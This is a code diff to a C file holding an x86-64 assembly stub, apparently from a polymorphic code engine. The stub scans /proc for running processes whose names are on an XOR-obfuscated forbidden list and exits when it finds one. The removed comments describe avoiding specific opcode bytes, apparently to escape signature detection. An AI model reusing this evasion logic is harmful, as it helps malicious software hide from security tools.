@@ -51,16 +51,12 @@ static const char STUB_POLY_DEMO_BLOCKS[] =
 
 static const char STUB_AV_DETECT[] =
 "_start:\n"
-    /* Réserve 4416 octets sur la pile sans émettre 0x81 (sub rsp, imm32) :
-    ** 4416 = 69 * 64 -> boucle de 69 itérations de sub rsp, 64 (0x83 0xec 0x40, ignoré par @o_83) */
 "_SET ecx, 69\n"
 "alloc_stack_loop:\n"
 "sub rsp, 64\n"
 "_DEC ecx\n"
 "jnz alloc_stack_loop\n"
 
-    /* Calcule r13 = rsp + 4096 et r14 = rsp + 4352 sans 0x81 ni 0x8d [rsp] :
-    ** r13 = rsp + (1 << 12), r14 = r13 + (1 << 8) */
 "_SET r13, rsp\n"
 "_SET eax, 1\n"
 "shl rax, 12\n"
@@ -70,7 +66,6 @@ static const char STUB_AV_DETECT[] =
 "shl rax, 8\n"
 "add r14, rax\n"
 
-    /* ── B1 : sys_open("/proc", O_DIRECTORY) ── */
 "_SET rax, 2\n"
 "lea rdi, [proc_path]\n"
 "_SET rsi, 0x10000\n"
@@ -80,7 +75,6 @@ static const char STUB_AV_DETECT[] =
 "_SET r9, rax\n"
 
 "scan_loop:\n"
-    /* ── B2 : sys_getdents64 ── */
 "_SET rax, 78\n"
 "_SET rdi, r9\n"
 "_SET rsi, rsp\n"
@@ -97,7 +91,6 @@ static const char STUB_AV_DETECT[] =
 "cmp rbp, rbx\n"
 "jge scan_loop\n"
 
-    /* Avance un pointeur rsi jusqu'à rbp + 19 avec _INC pour éviter mod=01 [rbp+19] */
 "_SET rsi, rbp\n"
 "_SET ecx, 19\n"
 "adv_dname_loop:\n"
@@ -106,19 +99,17 @@ static const char STUB_AV_DETECT[] =
 "jnz adv_dname_loop\n"
 "_SET r15, rsi\n"
 
-    /* Filtre PID : d_name[0] dans ['0'..'9'] (ASCII 48..57) */
-"_ZERO rax\n"
-"_SET al, [r15]\n"
+"xor eax, eax\n"
+"mov al, [r15]\n"
 "cmp al, 48\n"
 "jl next_entry\n"
 "cmp al, 57\n"
 "jg next_entry\n"
 
-    /* Construire "/proc/<PID>/comm" dans r14 ([rsp+4352]) */
 "_SET rdi, r14\n"
 "lea rsi, [proc_prefix]\n"
 "copy_prefix:\n"
-"_SET al, [rsi]\n"
+"mov al, [rsi]\n"
 "cmp al, 0\n"
 "je copy_prefix_done\n"
 "_STORE [rdi], al\n"
@@ -128,7 +119,7 @@ static const char STUB_AV_DETECT[] =
 "copy_prefix_done:\n"
 "_SET rsi, r15\n"
 "copy_pid:\n"
-"_SET al, [rsi]\n"
+"mov al, [rsi]\n"
 "cmp al, 0\n"
 "je copy_pid_done\n"
 "_STORE [rdi], al\n"
@@ -138,14 +129,13 @@ static const char STUB_AV_DETECT[] =
 "copy_pid_done:\n"
 "lea rsi, [comm_suffix]\n"
 "copy_suffix:\n"
-"_SET al, [rsi]\n"
+"mov al, [rsi]\n"
 "_STORE [rdi], al\n"
 "_INC rsi\n"
 "_INC rdi\n"
 "cmp al, 0\n"
 "jne copy_suffix\n"
 
-    /* Ouvrir /proc/<pid>/comm */
 "_SET rax, 2\n"
 "_SET rdi, r14\n"
 "_ZERO rsi\n"
@@ -154,7 +144,6 @@ static const char STUB_AV_DETECT[] =
 "jl next_entry\n"
 "_SET r10, rax\n"
 
-    /* Lire comm dans r13 ([rsp+4096]) */
 "_SET rax, 0\n"
 "_SET rdi, r10\n"
 "_SET rsi, r13\n"
@@ -162,7 +151,6 @@ static const char STUB_AV_DETECT[] =
 "syscall\n"
 "push rax\n"
 
-    /* Fermer /proc/<pid>/comm */
 "_SET rax, 3\n"
 "_SET rdi, r10\n"
 "syscall\n"
@@ -171,12 +159,11 @@ static const char STUB_AV_DETECT[] =
 "cmp rax, 0\n"
 "jle next_entry\n"
 
-    /* Terminer par '\0' et retirer '\n' (10) */
 "_SET rsi, r13\n"
 "_ZERO rcx\n"
 "_STORE [rsi + rax], cl\n"
 "strip_newline:\n"
-"_SET al, [rsi]\n"
+"mov al, [rsi]\n"
 "cmp al, 0\n"
 "je strip_done\n"
 "cmp al, 10\n"
@@ -184,16 +171,15 @@ static const char STUB_AV_DETECT[] =
 "_INC rsi\n"
 "jmp strip_newline\n"
 "found_newline:\n"
-"_ZERO eax\n"
+"xor eax, eax\n"
 "_STORE [rsi], al\n"
 "strip_done:\n"
 
-    /* Comparer contre forbidden_list (XOR 42) — strcmp inliné sans call/ret */
 "_ZERO r8\n"
 "check_forbidden:\n"
 "lea rsi, [forbidden_list]\n"
-"_ZERO eax\n"
-"_SET al, [rsi + r8]\n"
+"xor eax, eax\n"
+"mov al, [rsi + r8]\n"
 "cmp al, 0\n"
 "je next_entry\n"
 
@@ -202,8 +188,8 @@ static const char STUB_AV_DETECT[] =
 "add rsi, r8\n"
 "_ZERO rcx\n"
 "strcmp_loop:\n"
-"_SET al, [rdi + rcx]\n"
-"_SET dl, [rsi + rcx]\n"
+"mov al, [rdi + rcx]\n"
+"mov dl, [rsi + rcx]\n"
 "cmp dl, 0\n"
 "je skip_xor\n"
 "xor dl, 42\n"
@@ -219,20 +205,19 @@ static const char STUB_AV_DETECT[] =
 "_INC r8\n"
 "lea rsi, [forbidden_list]\n"
 "skip_forbidden_entry:\n"
-"_ZERO rax\n"
-"_SET al, [rsi + r8]\n"
+"xor eax, eax\n"
+"mov al, [rsi + r8]\n"
 "_INC r8\n"
 "cmp al, 0\n"
 "jne skip_forbidden_entry\n"
 
-"_ZERO eax\n"
-"_SET al, [rsi + r8]\n"
+"xor eax, eax\n"
+"mov al, [rsi + r8]\n"
 "cmp al, 0\n"
 "je next_entry\n"
 "jmp check_forbidden\n"
 
 "next_entry:\n"
-    /* Lit d_reclen (uint16 little-endian à rbp+16) via pointeur incrémenté */
 "_SET rsi, rbp\n"
 "_SET ecx, 16\n"
 "adv_reclen_loop:\n"
@@ -240,29 +225,27 @@ static const char STUB_AV_DETECT[] =
 "_DEC ecx\n"
 "jnz adv_reclen_loop\n"
 "_ZERO rcx\n"
-"_SET cl, [rsi]\n"
+"mov cl, [rsi]\n"
 "_INC rsi\n"
-"_ZERO eax\n"
-"_SET al, [rsi]\n"
+"xor eax, eax\n"
+"mov al, [rsi]\n"
 "shl rax, 8\n"
 "or rax, rcx\n"
 "add rbp, rax\n"
 "jmp process_entry_loop\n"
 
 "found_forbidden:\n"
-    /* Affiche "Reason: " (8 octets) */
 "_SET rax, 1\n"
 "_SET rdi, 1\n"
 "lea rsi, [found_msg]\n"
 "_SET rdx, 8\n"
 "syscall\n"
 
-    /* Calcule strlen(r13) inline sans call/ret */
 "_SET rsi, r13\n"
 "_ZERO rdx\n"
 "strlen_comm_loop:\n"
-"_ZERO eax\n"
-"_SET al, [rsi + rdx]\n"
+"xor eax, eax\n"
+"mov al, [rsi + rdx]\n"
 "cmp al, 0\n"
 "je strlen_comm_done\n"
 "_INC rdx\n"
@@ -273,14 +256,12 @@ static const char STUB_AV_DETECT[] =
 "_SET rsi, r13\n"
 "syscall\n"
 
-    /* Affiche '\n' */
 "_SET rax, 1\n"
 "_SET rdi, 1\n"
 "lea rsi, [newline]\n"
 "_SET rdx, 1\n"
 "syscall\n"
 
-    /* Libère la pile et quitte avec code 1 */
 "_SET ecx, 69\n"
 "free_stack_found:\n"
 "add rsp, 64\n"
